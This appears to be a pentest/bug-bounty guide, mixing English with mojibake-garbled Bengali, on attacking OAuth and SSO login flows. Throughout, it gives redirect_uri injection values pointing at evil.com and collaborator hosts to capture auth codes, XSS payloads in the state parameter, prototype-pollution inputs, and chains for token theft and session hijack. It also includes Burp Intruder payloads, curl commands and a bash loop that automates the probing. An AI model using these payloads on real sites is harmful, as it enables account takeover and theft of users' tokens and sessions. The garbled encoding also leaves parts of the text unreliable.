
External Authentication Injection (OAuth/SSO Content Spoofing) - à¦à¦Ÿà¦¾ high impact bugà¥¤ Authorized pentest à¦à¦° à¦œà¦¨à§à¦¯ perfectà¥¤ OAuth flow hijack + content manipulation chainà¥¤

ğŸ¯ Target Scope (OAuth/SSO)
1. Google/Facebook/GitHub login flows
2. "Login with {Provider}" buttons
3. Callback URLs: /auth/callback, /oauth/redirect
4. SSO endpoints: /saml, /oidc/callback
5. Profile linking: "Connect Google account"

ğŸ” Attack Surface
Primary Vectors
1. redirect_uri manipulation
2. state parameter injection  
3. User info display (name/email spoofing)
4. Post-auth landing pages
5. Error pages with user data

ğŸ› ï¸ Step-by-Step Testing
Step 1: OAuth Flow Mapping
1. Intercept login flow (Burp Proxy)
2. Identify parameters:
   ?client_id=...
   &redirect_uri=...
   &state=...
   &scope=...

3. Note callback URL pattern

Step 2: redirect_uri Injection
bash
# Original flow
GET /auth/google?redirect_uri=https://target.com/auth/callback

# Injection attempt
redirect_uri=https://evil.com/steal-token
redirect_uri=https://target.com/evil-callback
redirect_uri=https://evil.com%23target.com/auth/callback

Step 3: Content Spoofing in User Data
# Provider à¦¥à§‡à¦•à§‡ return à¦¹à¦“à¦¯à¦¼à¦¾ data manipulate
GET /auth/callback?code=AUTH_CODE&state=EVIL_PAYLOAD

# state parameter HTML injection
state=<img src=x onerror=alert(document.domain)>
state={"name": "<script>steal_token()</script>"}
ğŸ”¥ Exploitation Chains

Chain 1: Token Theft + Spoofing
1. BLH: target.com/js/oauth.js â†’ 404 â†’ evil.com/js/oauth.js
2. Login â†’ /auth/google?redirect_uri=evil.com/fake-callback
3. Provider redirects to evil.com with auth_code
4. evil.com forwards to target.com + injects malicious JS
5. JS steals session/cookies in target.com context

Chain 2: Admin Profile Spoofing
1. Connect Google account as normal user
2. Manipulate: name="<script src=/js/admin.js></script>"
3. Public profile shows spoofed admin interface
4. Victims click "fake admin links"

ğŸ§ª Burp Testing Workflow
1. Flow Interception
Proxy â†’ Catch OAuth requests
Repeater â†’ Manipulate redirect_uri/state
Collaborator â†’ External callback tracking

2. Parameter Fuzzing
Intruder payloads:
Â§Â§Â§target.com/evil
https://Â§Â§Â§.oastify.com
javascript:steal()
target.com%23Â§Â§Â§.evil.com

cURL OAuth Testing
bash
# redirect_uri bypass
curl -G "https://target.com/auth/google" \
  --data-urlencode "redirect_uri=https://collaborator.oastify.com/callback"

# state injection
curl -G "https://target.com/auth/callback" \
  --data-urlencode "state=<svg onload=alert(1)>"

ğŸ’¥ Impact Demonstration
Safe PoC Chain
1. Start: /auth/google (normal flow)
2. Intercept: Modify redirect_uri â†’ collaborator.oastify.com
3. Provider redirect â†’ Collaborator hit (code/token exposed)
4. Forward to: target.com/callback + malicious state payload
5. Execute: <img src="https://target.com/js/hijacked.js">
6. Proof: Collaborator interaction + JS execution screenshot

ğŸ“‹ Report Template

Title: External Authentication Injection â†’ Account Takeover
Components: OAuth Content Spoofing + redirect_uri Bypass
Attack Chain:
1. BLH: target.com/js/auth.js (404)
2. redirect_uri â†’ evil.com/steal
3. Token exfiltration + spoofed callback
4. Session hijack in trusted context

CVSS: 9.1 (AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

ğŸ”„ Advanced Vectors
1. Open Redirect + OAuth
redirect_uri=https://target.com/redirect?url=https://evil.com
â†’ Double redirect â†’ Token exposure

2. State Parameter Deserialization
state=php://filter/convert.base64-encode|...
state={"__proto__": {"admin": true}}

3. Provider-Specific Bypass
Google: redirect_uri[]=evil.com (array bypass)
GitHub: state parameter truncation

ğŸš€ Automation
bash
#!/bin/bash
OAUTH_PATHS=(
  "/auth/google" "/login/github" "/sso/oidc"
  "/oauth/facebook" "/connect/apple"
)

for path in "${OAUTH_PATHS[@]}"; do
  echo "[*] Testing: $path"
  curl -s -G "https://target.com$path" \
    --data-urlencode "redirect_uri=https://oastify.com/evil" \
    | grep -i "callback\|redirect"
done

âš ï¸ Detection Checklist
âœ… redirect_uri accepts external domains
âœ… state parameter renders as HTML  
âœ… OAuth JS/CSS 404 (BLH opportunity)
âœ… Post-auth pages execute user-controlled JS
âœ… Provider callback lacks origin validation
Pentest Pro Tip: à¦¸à¦¬ "Connect {Provider}" button à¦à¦° complete flow intercept à¦•à¦°à§‹à¥¤ Token exchange endpoint à¦—à§à¦²à§‹ goldmineà¥¤ Admin dashboard à¦ OAuth integration à¦šà§‡à¦• à¦•à¦°à§‹ priorityà¥¤
